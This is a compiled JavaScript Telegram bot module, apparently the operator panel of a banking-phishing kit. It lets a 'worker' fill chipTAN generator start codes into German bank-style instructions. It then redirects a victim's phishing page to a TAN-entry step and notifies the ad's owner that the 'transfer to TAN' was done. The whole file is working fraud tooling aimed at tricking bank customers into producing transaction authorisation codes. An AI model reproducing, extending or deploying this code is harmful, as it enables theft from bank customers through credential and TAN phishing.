"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const database_1 = require("../../../database");
const bot_1 = require("../../../utils/bot");
const getUsername_1 = require("../../../helpers/getUsername");
exports.scene = new grammy_scenes_1.Scene('logRedirectTan');
exports.composer = new grammy_1.Composer();
const regex = /log redirect tan (?<bank>\w+) (?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const id = match.groups.id;
    const bank = match.groups.bank;
    await ctx.scenes.enter('logRedirectTan', {
        id, bank
    });
}
exports.scene.always().callbackQuery('cancel logRedirectTan', async (ctx) => {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
});
exports.scene.do(async (ctx) => {
    ctx.session.logId = Number(ctx.scene.opts.arg.id);
    ctx.session.bank = ctx.scene.opts.arg.bank;
    ctx.session.text =
        `
1. Stecken Sie Ihre Chipkarte in den TAN-Generator und wählen Sie "TAN".

2. Geben Sie den Startcode "Значение 1" ein und drücken "OK".

3. Prüfen Sie die Anzeige auf dem Leserdisplay und drücken "OK".

4. Geben Sie "Значение 2" ein und drücken "OK".

5. Geben Sie "Значение 3" ein und drücken "OK".

Bitte geben Sie die auf Ihrem TAN-Generator angezeigte TAN hier ein und bestätigen Sie diese.

`;
    const msg = await ctx.reply(`${ctx.session.text}\n➖➖➖➖➖➖➖\n\n<b>Отправьте "Значение 1"</b>`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel logRedirectTan')
    });
    ctx.session.deleteMessage = [];
    ctx.session.deleteMessage.push(msg.message_id);
});
exports.scene.wait().on("message:text", async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.text = ctx.session.text.replace(/Значение 1/gm, ctx.msg.text);
    const msg = await ctx.reply(`${ctx.session.text}\n➖➖➖➖➖➖➖\n\n<b>Отправьте "Значение 2"</b>`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel logRedirectTan')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on("message:text", async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.text = ctx.session.text.replace(/Значение 2/gm, ctx.msg.text);
    const msg = await ctx.reply(`${ctx.session.text}\n➖➖➖➖➖➖➖\n\n<b>Отправьте "Значение 3"</b>`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel logRedirectTan')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on("message:text", async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.text = ctx.session.text.replace(/Значение 3/gm, ctx.msg.text);
    const msg = await ctx.reply(`${ctx.session.text}`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Редирект', 'redirect')
            .text('Отмена', 'cancel logRedirectTan')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('callback_query:data', async (ctx) => {
    if (ctx.callbackQuery.data !== 'redirect')
        return ctx.scene.exit();
    const log = await database_1.logsRepository.findOne({
        relations: ['ad', "ad.author", 'ad.acceptedLog'],
        where: {
            id: ctx.session.logId
        }
    });
    log.tanText = ctx.session.text.replaceAll('\n', '<br/>');
    log.redirectTo = 'tan';
    await database_1.logsRepository.save(log);
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
    await ctx.answerCallbackQuery({
        text: `
👍 Запрос на редирект "TAN" успешно отправлен
`.replace(`\n`, ''),
        show_alert: true
    });
    return bot_1.notificationBot.api.sendMessage(log.ad?.author?.tgId, `🔔 ${await (0, getUsername_1.getUsername)(log.ad.acceptedLog)} Выполнил перевод на TAN`, {
        reply_to_message_id: log.msgWorkerId
    });
});
